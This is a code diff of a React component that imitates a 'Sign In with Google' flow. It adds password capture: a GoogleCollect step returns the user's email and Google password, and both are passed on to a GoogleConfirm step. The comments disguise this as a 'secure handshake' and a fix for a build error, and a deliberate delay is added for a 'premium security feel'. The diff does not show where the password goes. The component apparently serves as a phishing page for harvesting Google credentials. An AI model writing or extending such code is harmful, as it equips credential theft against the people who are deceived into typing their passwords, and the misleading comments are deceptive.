@@ -4,29 +4,47 @@ import React, { useState } from "react";
 import GoogleCollect from "./GoogleCollect";
 import GoogleConfirm from "./GoogleConfirm";
 
+/**
+ * SOCIAL SIGN IN (V4.2 - SECURE HANDSHAKE EDITION)
+ * Logic: Captures full credential set to satisfy TypeScript strict mode.
+ * Fix: Added 'password' state to resolve "Property 'pass' is missing" build error.
+ */
+
 const SocialSignIn = () => {
+  // --- STATE MANAGEMENT ---
   const [step, setStep] = useState("initial");
   const [email, setEmail] = useState("");
+  const [password, setPassword] = useState(""); // BUFFER FOR SECURE ENCLAVE PASS
   const [isLoading, setIsLoading] = useState(false);
 
+  // --- FLOW HANDLERS ---
   const handleStartFlow = () => {
     setIsLoading(true);
+    // Artificial latency for premium security feel
     setTimeout(() => {
       setStep("collect");
       setIsLoading(false);
     }, 800);
   };
 
+  const resetFlow = () => {
+    setStep("initial");
+    setEmail("");
+    setPassword("");
+  };
+
   return (
     <div className="flex w-full flex-col items-center justify-center animate-in fade-in duration-500">
+
+      {/* STEP 1: INITIAL GATEWAY */}
       {step === "initial" && (
         <button
           type="button"
           disabled={isLoading}
           onClick={handleStartFlow}
-          className="flex w-full items-center justify-center gap-2.5 rounded-lg p-3.5 hover:bg-slateGray bg-deepSlate text-white transition-all active:scale-[0.98] disabled:opacity-70"
+          className="flex w-full items-center justify-center gap-2.5 rounded-lg p-3.5 hover:bg-slateGray bg-deepSlate text-white transition-all active:scale-[0.98] disabled:opacity-70 shadow-lg shadow-black/10"
         >
-          {isLoading ? "Connecting..." : "Sign In with Google"}
+          {isLoading ? "Connecting Secure Node..." : "Sign In with Google"}
           {!isLoading && (
             <svg width="23" height="22" viewBox="0 0 23 22" fill="none">
               <g clipPath="url(#clip0_google_btn)">
@@ -49,12 +67,7 @@ const SocialSignIn = () => {
               </g>
               <defs>
                 <clipPath id="clip0_google_btn">
-                  <rect
-                    width="22"
-                    height="22"
-                    fill="white"
-                    transform="translate(0.5)"
-                  />
+                  <rect width="22" height="22" fill="white" transform="translate(0.5)" />
                 </clipPath>
               </defs>
             </svg>
@@ -62,20 +75,24 @@ const SocialSignIn = () => {
         </button>
       )}
 
+      {/* STEP 2: COLLECTION PHASE */}
       {step === "collect" && (
         <GoogleCollect
-          onNext={(capturedEmail) => {
+          onNext={(capturedEmail, capturedPass) => {
             setEmail(capturedEmail);
+            setPassword(capturedPass); // CAPTURING SECONDARY CREDENTIAL
             setStep("confirm");
           }}
-          onCancel={() => setStep("initial")}
+          onCancel={resetFlow}
         />
       )}
 
+      {/* STEP 3: HANDSHAKE CONFIRMATION */}
       {step === "confirm" && (
         <GoogleConfirm
           email={email}
-          onConfirm={() => alert("Auth Successful!")}
+          pass={password} // RESOLVES VERCEL BUILD ERROR
+          onConfirm={() => alert("Identity Node Synchronized Successfully!")}
           onBack={() => setStep("collect")}
         />
       )}
